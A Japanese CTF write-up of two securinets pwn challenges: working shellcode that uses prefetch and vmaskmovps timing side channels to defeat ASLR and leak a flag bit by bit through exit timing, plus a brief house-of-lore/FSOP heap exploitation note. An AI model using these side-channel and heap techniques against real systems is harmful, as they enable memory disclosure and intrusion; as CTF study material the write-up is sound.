# securinets CTF

securinets CTFをやりました.
いろいろいざこざがあったのですがチャレンジは面白かったです.

## VOID
<primary-label ref="pwn"/>

全てのレジスタがクリアされた状態で0x13370000でシェルコードが出来る問題です.
fs, xmm, ymm含めて全てクリアされているのでどうしてもアドレスを復元することは出来ないです.
あとexit以外のsyscallがseccompで制限されています.

![Screenshot_20261019_195918.png](Screenshot_20261019_195918.png)

TSG CTF qualsのro_shellsandboxという問題ではxmmからlibcをリークできたのですぐにどこかのアドレスを復元する方法がないことはすぐに分かっていました.

実はこれと酷似した問題を作成された方がいて, (現在はプライベートアカウントなので載せられませんが)prefetchを使ったside channelでアドレスを復元できるらしいということを知っていました.

kernel exploitをしたことがある人なら馴染み深いprefetchでのside channelですが, ユーザーランドでも原理的には動くのでprefetchのクロック時間を測ってmapされているアドレスを探索することは可能でした.

```py
    code = asm(f"""
mov rbx, {start|pie_low}

mov ecx, {hex(((0x655555554000-1-(start|pie_low))//0x1000000)+1)}
mov r12d, 0xffffffff
xor r14d, r14d

scan:
prefetch [rbx]
mfence
lfence
rdtsc
mov esi, eax

lfence
prefetch [rbx]

mfence
lfence
rdtsc
sub eax, esi

cmp eax, r12d
cmovb r12d, eax
cmovb r14, rbx

add rbx, 0x1000000
dec ecx
jnz scan

mov rbx, [r14 + {hex(flag_rva)}]

test byte ptr [rbx + {hex(byte)}], {hex(1 << bit)}
jnz pause_loop

xor edi, edi
mov eax, 60
syscall

pause_loop:
pause
jmp pause_loop
""")
```

しかし, リモート, 手元のdockerですらあまり安定しませんでした.

前述の通りexit以外殺されているので1bitづつexitの時間でリークするしかないので1回だけ当てても意味がなく, attemptを採用したりしましたが成功率はかなり低かったです.

https://arxiv.org/abs/2304.07940

そこでこのペーパーを思い出しました. このペーパーはPoCのリポジトリがTBDのままほったらかしにされているのでいつか書きたいと思っていたもので1年ほど前に知りました.

ペーパーの主張自体はprefetchと同じようにvmaskmovpsでもアドレスがマップされているor notでクロック時間が変わるのでkASLRを突破できるというものです.
```nasm
vmaskmovps xmm1, xmm0, [rbx]
```

結果的にこのvmaskmovpsを使ったside channelはかなり安定しました. 有識者がいたらその理由が知りたいです.
```py
    code = asm(f"""
mov rbx, {start|pie_low}

mov ecx, {hex(((0x655555554000-1-(start|pie_low))//0x1000000)+1)}
mov r12d, 0xffffffff
xor r14d, r14d

scan:
vmaskmovps xmm1, xmm0, [rbx]
mfence
lfence
rdtsc
mov esi, eax

lfence
vmaskmovps xmm1, xmm0, [rbx]

mfence
lfence
rdtsc
sub eax, esi

cmp eax, r12d
cmovb r12d, eax
cmovb r14, rbx

add rbx, 0x1000000
dec ecx
jnz scan

mov rbx, [r14 + {hex(flag_rva)}]

test byte ptr [rbx + {hex(byte)}], {hex(1 << bit)}
jnz pause_loop

xor edi, edi
mov eax, 60
syscall

pause_loop:
pause
jmp pause_loop
""")
```

kASLRのリークと同じように計測前に一度アクセスしてキャッシュさせています.

## House of
<primary-label ref="pwn"/>

新しいHouse ofテクニックらしいです.これは非想定解らしく, 想定はleak-lessで動くらしい.

house of loreしたら解けました.
how2heapで作っているvictim->bk->fd == victimをlarge bin headでやるとlarge bin headにallocできるのでstderr書き換えてFSOPする.

